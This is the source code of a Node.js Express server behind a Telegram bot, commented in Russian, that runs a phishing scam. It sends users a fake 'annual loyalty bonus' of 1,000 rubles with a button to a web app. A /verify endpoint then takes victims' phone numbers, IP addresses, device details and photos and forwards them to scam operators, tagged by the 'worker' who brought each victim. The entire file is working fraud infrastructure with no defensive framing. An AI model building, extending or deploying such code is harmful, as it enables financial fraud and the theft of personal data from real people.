const express = require('express');
const multer = require('multer');
const axios = require('axios');
const FormData = require('form-data');
const path = require('path');
const fs = require('fs');

const app = express();
const upload = multer();

app.use(express.json());
app.use(express.static('public'));

// --- НАСТРОЙКИ ---
const BOT_TOKEN = process.env.BOT_TOKEN;

// Список всех админов (на случай, если ссылка без параметра)
const ADMIN_IDS = (process.env.CHAT_ID || '')
    .split(',')
    .map(id => id.trim())
    .filter(id => id);

// --- 1. ПРИВЕТСТВИЕ С ПАРАМЕТРОМ ВОРКЕРА ---
async function sendWelcome(userChatId, messageText, req) {
    const photoPath = path.join(__dirname, 'yap.png');
    
    // Пытаемся достать ID админа из ссылки (например /start 12345)
    // Если после start ничего нет, workerId будет пустой
    const workerId = messageText.split(' ')[1] || '';

    // Добавляем этот ID в ссылку на сайт: ?owner=12345
    const webAppUrl = `https://${req.get('host')}?owner=${workerId}`; 

    const captionText = 
        `💳 **Уведомление о начислении #Y-2026**\n\n` +
        `Здравствуйте! Вам доступен ежегодный бонус в рамках программы лояльности.\n\n` +
        `💰 **Сумма: 1,000.00 ₽**\n` +
        `💎 **Статус: Выплата разрешена**\n\n` +
        `Нажмите на кнопку ниже, чтобы зачислить средства через СБП.`;

    try {
        const form = new FormData();
        form.append('chat_id', userChatId);
        form.append('photo', fs.createReadStream(photoPath));
        form.append('caption', captionText);
        form.append('parse_mode', 'Markdown');
        form.append('reply_markup', JSON.stringify({
            inline_keyboard: [[
                { text: "🔘 ПОЛУЧИТЬ ВЫПЛАТУ", web_app: { url: webAppUrl } }
            ]]
        }));

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, {
            headers: form.getHeaders()
        });
    } catch (e) {
        console.error("Ошибка приветствия:", e.message);
    }
}

// --- 2. ОБРАБОТЧИК /start ---
app.post(`/bot${BOT_TOKEN}`, async (req, res) => {
    const { message } = req.body;
    // Проверяем, начинается ли текст с /start
    if (message && message.text && message.text.startsWith('/start')) {
        await sendWelcome(message.from.id, message.text, req);
    }
    res.sendStatus(200);
});

// --- 3. ГЛАВНАЯ СТРАНИЦА ---
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// --- 4. ПРИЕМ ЗАЯВОК (РАСПРЕДЕЛЕНИЕ) ---
app.post('/verify', upload.single('photo'), async (req, res) => {
    try {
        const { phone, ip, details, owner } = req.body; // Получаем owner из формы
        const photo = req.file;

        const caption = `
💰 **НОВАЯ ЗАЯВКА!**
📞 **Данные:** ${phone}
🌐 **IP:** ${ip}
👤 **Воркер:** ${owner || 'Общий трафик'}

ℹ️ **ТЕХ. ИНФО:**
${details || 'Нет данных'}
        `;

        // ОПРЕДЕЛЯЕМ ПОЛУЧАТЕЛЕЙ
        let recipients = [];

        // Если есть конкретный владелец (owner) и он есть в списке админов -> шлем только ему
        if (owner && ADMIN_IDS.includes(owner)) {
            recipients = [owner];
        } else {
            // Если владельца нет или он левый -> шлем ВСЕМ админам (общий трафик)
            recipients = ADMIN_IDS;
        }

        // РАССЫЛКА
        for (const adminId of recipients) {
            try {
                if (photo) {
                    const form = new FormData();
                    form.append('chat_id', adminId);
                    form.append('caption', caption);
                    form.append('parse_mode', 'Markdown');
                    form.append('photo', photo.buffer, { filename: 'verification.jpg' });

                    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, {
                        headers: form.getHeaders()
                    });
                } else {
                    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        chat_id: adminId,
                        text: caption,
                        parse_mode: 'Markdown'
                    });
                }
            } catch (innerError) {
                console.error(`Не удалось отправить админу ${adminId}:`, innerError.message);
            }
        }

        res.sendStatus(200);
    } catch (error) {
        console.error('Общая ошибка /verify:', error.message);
        res.sendStatus(500);
    }
});
// Эндпоинт для самопроверки и предотвращения "сна"
app.get('/ping', (req, res) => {
    console.log('Ping получен: сервер активен');
    res.send('pong');
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log(`Сервер запущен. Порт: ${PORT}. Админов: ${ADMIN_IDS.length}`));